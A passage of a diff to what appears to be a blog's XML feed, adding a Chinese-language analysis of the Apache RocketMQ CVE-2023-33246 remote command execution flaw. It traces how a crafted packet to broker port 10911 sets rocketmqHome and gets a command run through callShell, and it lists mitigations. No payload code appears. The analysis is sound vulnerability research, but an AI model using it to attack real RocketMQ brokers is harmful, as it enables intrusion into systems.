worth of history --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 设置日志输出级别 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;ERROR&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 自定义logger --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;custom&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CUSTOM&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>环境配置完成后运行主类<code>org.apache.rocketmq.broker.BrokerStartup</code>启动ROCKETMQ Brocker，控制台输出以下内容则Brocker启动成功</p>
+<p><img src="/archives/3553c506/image-20230720155841681.png" alt="image-20230720155841681"></p>
+<p><strong>靶场搭建</strong></p>
+<p>使用vulhub靶场一键搭建</p>
+<p><code>https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246</code></p>
+<h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>Broker在启动时会首先创建一个<code>BrokerController</code>然后运行它</p>
+<p><img src="/archives/3553c506/image-20230720164935939.png" alt="image-20230720164935939"></p>
+<p>BrockerController创建过程中主要进行了配置文件解析、命令行解析、网络服务配置、日志配置等操作。</p>
+<p>Controller启动时相继启动以下服务，其中在启动<code>remotingServer</code>服务时会启动<code>broker</code>监听在默认的<code>10911</code>端口</p>
+<p><img src="/archives/3553c506/image-20230720165303285.png" alt="image-20230720165303285"></p>
+<p>在进行<code>filterServerManager</code>启动过程中会以30S的频率轮询创建<code>filterServer</code></p>
+<p><img src="/archives/3553c506/image-20230720165452954.png" alt="image-20230720165452954"></p>
+<p>创建<code>filterServer</code>时调用方法<code>org.apache.rocketmq.broker.filtersrv.FilterServerManager#buildStartCommand</code>解析数据拼接参数</p>
+<p><img src="/archives/3553c506/image-20230720165739570.png" alt="image-20230720165739570"></p>
+<p>在进行参数拼接过程中会从<code>brokerConfig</code>中获取<code>rocketmqHome</code>与<code>namesrvAddr</code>两个值。</p>
+<p>我们可以通过模拟RocketMQ协议向10911端口发送特制的数据包来影响<code>rocketmqHome</code>的值为可控的值，又因应用在进行命令拼接过程中未对用户的输入值进行有效的过滤，从而导致任意命令执行，此时我们使用网络上公开的PoC向10911端口发送数据然后调试</p>
+<p><img src="/archives/3553c506/image-20230720170706116.png" alt="image-20230720170706116"></p>
+<p><img src="/archives/3553c506/image-20230720170558173.png" alt="image-20230720170558173"></p>
+<p>可以看到，此时获取的<code>rocketmqHome</code>值已经变更为我们输入的Payload</p>
+<p>在<code>buildStartCommand</code>方法调用完毕后，会返回拼接的字符串然后调用<code>org.apache.rocketmq.broker.filtersrv.FilterServerUtil#callShell</code>方法进行命令执行</p>
+<p>整个流程的调用栈为</p>
+<p><img src="/archives/3553c506/image-20230720171016289.png" alt="image-20230720171016289"></p>
+<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><p>1、非必须勿向互联网开放不必要的服务端口，控制暴露面；</p>
+<p>2、关键服务增加用户权限校验；</p>
+<p>3、升级软件到不受影响的版本或最新版。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246</a></li>
+<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-33246">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-33246</a></li>
+<li><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101</a></li>
+</ul>
+<h2 id="软安解决方案"><a href="#软安解决方案" class="headerlink" title="软安解决方案"></a>软安解决方案</h2>]]></content>
+      <categories>
+        <category>漏洞分析</category>
+        <category>安全技术</category>
+      </categories>
+      <tags>
+        <tag>Apache RocketMQ</tag>
+        <tag>RCE</tag>
+        <tag>远程代码执行</tag>
+        <tag>反序列化</tag>
+        <tag>网络安全</tag>
+        <tag>漏洞分析</tag>
+        <tag>漏洞</tag>
+        <tag>CVE-2023-33246</tag>
       </tags>
   </entry>
   <entry>
@@ -6904,10 +6909,10 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
         <category>安全技术</category>
       </categories>
       <tags>
+        <tag>认证绕过</tag>
         <tag>网络安全</tag>
         <tag>漏洞分析</tag>
         <tag>漏洞</tag>
-        <tag>认证绕过</tag>
         <tag>WebFlux Security</tag>
         <tag>CVE-2023-34034</tag>
       </tags>
